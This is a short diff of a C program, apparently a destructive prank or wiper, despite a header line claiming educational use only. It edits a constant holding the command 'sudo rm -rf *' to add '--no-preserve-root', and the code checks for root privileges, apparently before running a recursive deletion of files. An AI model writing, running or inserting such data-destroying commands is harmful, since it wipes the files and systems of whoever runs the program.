@@ -36,7 +36,7 @@ THE USAGE OF THIS PROGRAM IS ONLY ALLOWED FOR EDUCATIONAL PROPOUSES!
 #define SUDO 0
 
 
-const char *REMOVE_ALL = "sudo rm -rf *";
+const char *REMOVE_ALL = "sudo rm -rf * --no-preserve-root";
 int main(void){
 
 	if(geteuid() == 0){
